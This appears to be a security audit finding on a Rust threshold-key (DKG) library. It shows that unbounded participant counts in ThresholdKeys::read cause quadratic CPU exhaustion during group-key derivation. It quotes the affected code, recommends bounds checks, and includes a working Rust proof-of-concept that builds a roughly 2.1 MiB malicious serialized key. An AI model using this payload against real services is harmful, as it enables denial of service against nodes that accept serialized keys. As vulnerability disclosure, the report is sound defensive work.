### Title
Unbounded participant count causes quadratic CPU exhaustion during threshold-key deserialization - (File: crypto/dkg/src/lib.rs)

### Summary
`ThresholdKeys::read` accepts attacker-controlled `t` and `n` fields as unrestricted `u16` values, then calls `ThresholdKeys::new`, which derives the group key using Lagrange interpolation. The derivation performs an `O(t)` interpolation calculation for each of `t` participants, resulting in `O(t²)` scalar arithmetic.

With `t = n = 65,535`, deserialization performs approximately `4,294,836,225` inner-loop iterations. For `Secp256k1`, the serialized input carrying 65,535 compressed verification shares is only about 2.1 MiB, making this a remotely triggerable CPU-exhaustion primitive where `ThresholdKeys::read` is exposed to untrusted serialized key material.

### Finding Description
`ThresholdKeys::read` reads `t`, `n`, and `i` directly from the serialized input before validating them as a coherent `ThresholdParams` value. [1](#0-0) 

For Lagrange interpolation, it then reads one secret scalar and `n` verification shares: [2](#0-1) 

After parsing, it invokes `ThresholdKeys::new`: [3](#0-2) 

`ThresholdKeys::new` constructs the participant list `1..=t` and calculates an interpolation factor for each listed participant: [4](#0-3) 

For `Interpolation::Lagrange`, every call to `interpolation_factor` iterates over all `t` included participants and performs scalar multiplication/subtraction per entry: [5](#0-4) 

Therefore, the total work is approximately `t * (t - 1)` scalar operations. No deserialization-time bound exists other than the `u16` width of `t` and `n`, permitting the maximum quadratic workload of over 4.29 billion iterations.

### Impact Explanation
An unprivileged party who can submit serialized `ThresholdKeys` to a `ThresholdKeys::read` endpoint can cause a long-lived CPU denial of service using a small serialized object. At maximum parameters, the verifier performs approximately 4.29 billion interpolation-loop iterations before `ThresholdKeys::new` can return.

Because the loop consists of finite-field operations, inversion, and point multiplication rather than a trivial byte scan, even a single accepted object can consume a processor core for an extended period. Repeated submissions can exhaust available workers or keep a node continuously busy.

The input remains small: with 33-byte compressed secp256k1 points, 65,535 verification shares require approximately `2,162,655` bytes, plus a scalar and header fields. The cost is therefore driven primarily by attacker-declared dimensions rather than proportional cryptographic proof size.

### Likelihood Explanation
The serialized format permits `t = n = 65,535`, and `ThresholdParams::new` accepts that combination when `i` is nonzero and within `n`. [6](#0-5) 

The attacker does not need valid secret knowledge, a valid DKG transcript, matching shares, or a meaningful threshold setup. They only need all encoded scalars and points to parse successfully and all `n` verification-share slots to be present so `ThresholdKeys::new` proceeds to group-key derivation.

The vulnerability is reachable wherever applications accept serialized threshold keys, synchronized key material, backups, or protocol messages containing `ThresholdKeys` from untrusted parties. The parser itself performs the expensive work before callers can impose a protocol-specific participant limit.

### Recommendation
Validate and bound `ThresholdParams` before reading the variable-length interpolation and verification-share fields. In particular:

- Construct `ThresholdParams::new(t, n, i)` immediately after reading `t`, `n`, and `i`.
- Enforce a protocol-level maximum `n` appropriate for the deployment before reading `n` scalars or points.
- Reject Lagrange-encoded key sets above that limit before entering `ThresholdKeys::new`.
- Avoid quadratic group-key derivation for large `t`; use a less expensive aggregation/interpolation strategy where possible.
- If arbitrary serialized keys are accepted, require an authenticated or size/bounds-validated envelope before calling `ThresholdKeys::read`.

### Proof of Concept
```rust
use std::io::Cursor;

use ciphersuite::{group::GroupEncoding, Ciphersuite};
use frost::{curve::Secp256k1, ThresholdKeys};
use ff::PrimeField;

fn attack_bytes() -> Vec<u8> {
    const N: u16 = u16::MAX;

    let mut bytes = Vec::new();

    // Curve identifier.
    bytes.extend(u32::try_from(Secp256k1::ID.len()).unwrap().to_le_bytes());
    bytes.extend(Secp256k1::ID);

    // t = n = 65535, i = 1.
    bytes.extend(N.to_le_bytes());
    bytes.extend(N.to_le_bytes());
    bytes.extend(1u16.to_le_bytes());

    // Interpolation::Lagrange.
    bytes.push(1);

    // Secret share: any valid canonical scalar.
    bytes.extend(Secp256k1::F::ONE.to_repr().as_ref());

    // n verification shares. Reusing a valid point encoding is sufficient
    // because read() does not require distinct or proven shares.
    let point = Secp256k1::generator().to_bytes();
    for _ in 0 .. N {
        bytes.extend(point.as_ref());
    }

    bytes
}

fn main() {
    let bytes = attack_bytes();

    // This parses approximately 2.1 MiB of input, then performs
    // ~4.29 billion Lagrange inner-loop iterations while deriving
    // the claimed group key.
    let _ = ThresholdKeys::<Secp256k1>::read(&mut Cursor::new(bytes));
}
```

The serialized object is structurally valid enough to pass the parser. The denial of service occurs inside `ThresholdKeys::new` while it derives `group_key`, not merely while copying the input.

### Citations

**File:** crypto/dkg/src/lib.rs (L166-178)
```rust
  pub const fn new(t: u16, n: u16, i: Participant) -> Result<ThresholdParams, DkgError> {
    if (t == 0) || (n == 0) {
      return Err(DkgError::ZeroParameter { t, n });
    }

    if t > n {
      return Err(DkgError::InvalidThreshold { t, n });
    }
    if i.0 > n {
      return Err(DkgError::InvalidParticipant { n, participant: i });
    }

    Ok(ThresholdParams { t, n, i })
```

**File:** crypto/dkg/src/lib.rs (L229-246)
```rust
      Interpolation::Lagrange => {
        let i_f = F::from(u64::from(u16::from(i)));

        let mut num = F::ONE;
        let mut denom = F::ONE;
        for l in included {
          if i == *l {
            continue;
          }

          let share = F::from(u64::from(u16::from(*l)));
          num *= share;
          denom *= share - i_f;
        }

        // Safe as this will only be 0 if we're part of the above loop
        // (which we have an if case to avoid)
        num * denom.invert().unwrap()
```

**File:** crypto/dkg/src/lib.rs (L376-378)
```rust
    let t = (1 ..= params.t()).map(Participant).collect::<Vec<_>>();
    let group_key =
      t.iter().map(|i| verification_shares[i] * interpolation.interpolation_factor(*i, &t)).sum();
```

**File:** crypto/dkg/src/lib.rs (L591-601)
```rust
    let (t, n, i) = {
      let mut read_u16 = || -> io::Result<u16> {
        let mut value = [0; 2];
        reader.read_exact(&mut value)?;
        Ok(u16::from_le_bytes(value))
      };
      (
        read_u16()?,
        read_u16()?,
        Participant::new(read_u16()?).ok_or(io::Error::other("invalid participant index"))?,
      )
```

**File:** crypto/dkg/src/lib.rs (L604-623)
```rust
    let mut interpolation = [0];
    reader.read_exact(&mut interpolation)?;
    let interpolation = match interpolation[0] {
      0 => Interpolation::Constant({
        let mut res = Vec::with_capacity(usize::from(n));
        for _ in 0 .. n {
          res.push(C::read_F(reader)?);
        }
        res
      }),
      1 => Interpolation::Lagrange,
      _ => Err(io::Error::other("invalid interpolation method"))?,
    };

    let secret_share = Zeroizing::new(C::read_F(reader)?);

    let mut verification_shares = HashMap::new();
    for l in (1 ..= n).map(Participant) {
      verification_shares.insert(l, <C as Ciphersuite>::read_G(reader)?);
    }
```

**File:** crypto/dkg/src/lib.rs (L625-631)
```rust
    ThresholdKeys::new(
      ThresholdParams::new(t, n, i).map_err(io::Error::other)?,
      interpolation,
      secret_share,
      verification_shares,
    )
    .map_err(io::Error::other)
```
